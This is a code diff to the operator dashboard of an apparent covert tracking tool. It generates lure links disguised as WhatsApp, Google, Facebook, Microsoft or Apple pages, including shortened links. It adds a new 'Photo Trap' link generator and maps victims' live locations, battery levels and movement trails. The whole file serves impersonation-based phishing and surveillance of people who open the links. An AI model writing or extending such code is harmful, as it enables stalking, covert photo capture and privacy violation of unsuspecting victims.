@@ -55,7 +55,7 @@
         #infoPanel .label { opacity: 0.6; }
         #infoPanel .value { font-weight: 500; color: #fff; }
 
-        #map { height: calc(100vh - 200px); width: 100vw; }
+        #map { height: calc(100vh - 220px); width: 100vw; }
 
         #actions {
             position: absolute;
@@ -74,16 +74,12 @@
             justify-content: center;
             border: 1px solid #0f3460;
         }
-        #actions a, #actions button {
+        #actions button {
             text-decoration: none; padding: 8px 16px; border-radius: 30px;
             font-weight: 600; font-size: 13px; border: none;
             cursor: pointer; transition: all 0.2s;
             display: inline-flex; align-items: center; gap: 6px;
         }
-        #actions .btn-google { background: #1a73e8; color: white; }
-        #actions .btn-google:hover { background: #1557b0; }
-        #actions .btn-apple { background: #555; color: white; }
-        #actions .btn-apple:hover { background: #333; }
         #actions .btn-clear { background: #e94560; color: white; }
         #actions .btn-clear:hover { background: #c62840; }
 
@@ -143,9 +139,58 @@
             border-radius: 6px;
             font-family: monospace;
         }
+
+        /* Photo Trap Section */
+        #photoTrapSection {
+            background: #16213e;
+            padding: 10px 20px;
+            border-bottom: 1px solid #0f3460;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 10px;
+        }
+        #photoTrapSection label {
+            color: #e0e0e0;
+            font-size: 13px;
+            opacity: 0.7;
+        }
+        #photoTrapSection select {
+            background: #0f3460;
+            color: white;
+            border: 1px solid #1a4a6e;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        #photoTrapSection .link-display {
+            background: #0f3460;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            flex: 1;
+            min-width: 200px;
+            color: #4caf50;
+        }
+        #photoTrapSection .copy-link {
+            background: #4caf50;
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        #photoTrapSection .copy-link:hover { background: #388e3c; }
+
         @media (max-width: 768px) {
             #brandSelector { flex-direction: column; align-items: stretch; }
             #brandSelector .link-display { min-width: auto; }
+            #photoTrapSection { flex-direction: column; align-items: stretch; }
         }
 
         #historySection {
@@ -200,12 +245,11 @@
             color: #4caf50;
             border: 1px solid #4caf50;
         }
-
         @media (max-width: 768px) {
             #topBar { flex-direction: column; align-items: flex-start; }
             #infoPanel { flex-direction: column; gap: 5px; }
             #actions { flex-direction: column; width: 90%; border-radius: 16px; padding: 15px; }
-            #actions a, #actions button { width: 100%; justify-content: center; }
+            #actions button { width: 100%; justify-content: center; }
             #historySection { flex-direction: column; align-items: stretch; }
         }
     </style>
@@ -233,6 +277,20 @@
     <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
     <button class="copy-link" id="copyLinkBtn">📋 Copy Link</button>
     <span class="short-link" id="shortLinkDisplay">rebrand.ly/z1izp36</span>
+</div>
+
+<!-- Photo Trap Section -->
+<div id="photoTrapSection">
+    <label>📷 Photo Trap:</label>
+    <select id="photoTemplateSelect">
+        <option value="google">🔵 Google</option>
+        <option value="whatsapp" selected>💬 WhatsApp</option>
+        <option value="facebook">🔷 Facebook</option>
+        <option value="microsoft">⬡ Microsoft</option>
+        <option value="apple"> Apple</option>
+    </select>
+    <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/photo?template=whatsapp</span>
+    <button class="copy-link" id="copyPhotoLinkBtn">📋 Copy</button>
 </div>
 
 <div id="infoPanel">
@@ -312,6 +370,44 @@
     });
 
     // =============================================
+    // PHOTO TRAP
+    // =============================================
+    const photoTemplateSelect = document.getElementById('photoTemplateSelect');
+    const photoLinkDisplay = document.getElementById('photoLinkDisplay');
+    const copyPhotoLinkBtn = document.getElementById('copyPhotoLinkBtn');
+
+    function updatePhotoLink() {
+        const template = photoTemplateSelect.value;
+        const url = BASE_URL + '/photo?template=' + template;
+        photoLinkDisplay.textContent = url;
+    }
+
+    photoTemplateSelect.addEventListener('change', updatePhotoLink);
+    updatePhotoLink();
+
+    copyPhotoLinkBtn.addEventListener('click', function() {
+        const link = photoLinkDisplay.textContent;
+        navigator.clipboard.writeText(link).then(() => {
+            const originalText = copyPhotoLinkBtn.textContent;
+            copyPhotoLinkBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyPhotoLinkBtn.textContent = originalText;
+            }, 2000);
+        }).catch(() => {
+            const range = document.createRange();
+            range.selectNode(photoLinkDisplay);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            const originalText = copyPhotoLinkBtn.textContent;
+            copyPhotoLinkBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyPhotoLinkBtn.textContent = originalText;
+            }, 2000);
+        });
+    });
+
+    // =============================================
     // MAP & MULTI-USER TRACKING
     // =============================================
     const map = L.map('map').setView([51.505, -0.09], 13);
@@ -319,11 +415,10 @@
         attribution: '© OpenStreetMap contributors'
     }).addTo(map);
 
-    let markers = {}; // { session_id: { marker, popup, circle, pathLine, pathCoordinates } }
+    let markers = {};
     let historyData = [];
     let historyVisible = false;
 
-    // Color palette for different users
     const colors = [
         '#e94560', '#4caf50', '#ffc107', '#4285f4', '#ff5722',
         '#9c27b0', '#00bcd4', '#ff9800', '#8bc34a', '#e91e63',
@@ -350,7 +445,6 @@
 
     function getShortId(sessionId) {
         if (!sessionId) return 'Unknown';
-        // Show first 6 characters of session ID
         return sessionId.substring(0, 8);
     }
 
@@ -381,7 +475,7 @@
     }
 
     // =============================================
-    // FETCH USERS (Multi-User)
+    // FETCH USERS
     // =============================================
     function fetchUsers() {
         fetch(RENDER_URL + '/get-users')
@@ -391,7 +485,6 @@
                 updateUsersCount(count);
                 setStatus(`🟢 ${count} active users`, 'active');
 
-                // Track which sessions are still active
                 const activeSessions = new Set();
 
                 users.forEach(user => {
@@ -404,7 +497,6 @@
                     const timestamp = user.timestamp;
 
                     if (lat && lng) {
-                        // If marker doesn't exist, create it
                         if (!markers[sessionId]) {
                             const color = getColor();
                             markers[sessionId] = {
@@ -417,11 +509,9 @@
                         const markerData = markers[sessionId];
                         const color = markerData.color;
 
-                        // Update or create marker
                         if (markerData.marker) {
                             markerData.marker.setLatLng([lat, lng]);
                         } else {
-                            // Create custom colored marker
                             const icon = L.divIcon({
                                 html: `<div style="background:${color};width:16px;height:16px;border-radius:50%;border:3px solid white;box-shadow:0 2px 6px rgba(0,0,0,0.3);"></div>`,
                                 className: '',
@@ -437,10 +527,9 @@
                                 <b>🔋 Battery:</b> ${user.battery ? user.battery.level + '%' : '--'}<br>
                                 <b>🕐 Last update:</b> ${formatTime(timestamp)}
                             `;
-                            markerData.marker.bindPopup(popupContent).openPopup();
+                            markerData.marker.bindPopup(popupContent);
                         }
 
-                        // Update accuracy circle
                         if (markerData.circle) {
                             markerData.circle.setLatLng([lat, lng]);
                             if (accuracy) markerData.circle.setRadius(accuracy);
@@ -454,7 +543,6 @@
                             }).addTo(map);
                         }
 
-                        // Update path (movement trail)
                         markerData.pathCoordinates.push([lat, lng]);
                         if (markerData.pathCoordinates.length > 2) {
                             if (markerData.pathLine) {
@@ -470,7 +558,6 @@
                     }
                 });
 
-                // Remove markers for inactive sessions
                 Object.keys(markers).forEach(sessionId => {
                     if (!activeSessions.has(sessionId)) {
                         if (markers[sessionId].marker) {
@@ -486,7 +573,6 @@
                     }
                 });
 
-                // Update last update time
                 if (users.length > 0) {
                     const latest = users.reduce((a, b) => {
                         return a.timestamp > b.timestamp ? a : b;
@@ -494,7 +580,6 @@
                     document.getElementById('timeDisplay').textContent = formatTime(latest.timestamp);
                 }
 
-                // Update total locations count
                 fetch(RENDER_URL + '/get-all-history')
                     .then(res => res.json())
                     .then(history => {
@@ -529,7 +614,6 @@
         }
         let html = '';
         const reversed = [...historyData].reverse();
-        // Show last 100 entries
         const displayData = reversed.slice(0, 100);
         displayData.forEach(entry => {
             if (entry.lat && entry.lng) {
@@ -556,7 +640,6 @@
         if (confirm('🗑️ Clear all location data for all users?')) {
             fetch(RENDER_URL + '/clear')
                 .then(() => {
-                    // Remove all markers
                     Object.keys(markers).forEach(sessionId => {
                         if (markers[sessionId].marker) {
                             map.removeLayer(markers[sessionId].marker);
@@ -596,7 +679,7 @@
     // =============================================
     // POLLING
     // =============================================
-    setInterval(fetchUsers, 3000); // Every 3 seconds
+    setInterval(fetchUsers, 3000);
     fetchUsers();
 
     setInterval(fetchHistory, 10000);
